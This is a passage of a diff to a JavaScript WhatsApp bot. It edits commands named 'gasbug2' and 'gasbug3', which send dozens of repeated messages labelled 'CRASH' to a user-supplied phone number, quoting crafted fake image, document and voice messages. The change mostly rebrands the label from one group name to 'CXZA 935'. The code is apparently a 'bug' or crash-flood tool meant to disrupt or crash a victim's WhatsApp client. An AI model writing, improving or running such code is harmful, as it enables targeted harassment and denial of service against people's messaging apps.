+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc1})
 await m.reply(`Succes`)
 break
 case 'gasbug2':
@@ -6031,71 +5765,41 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`, 
+"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`, 
 "jpegThumbnail": thumb
 } 
 } 
 }
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto1})
 await m.reply(`Succes`)
 break
 case 'gasbug3':
@@ -6115,66 +5819,36 @@ message: {
 }
 } 
 }
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
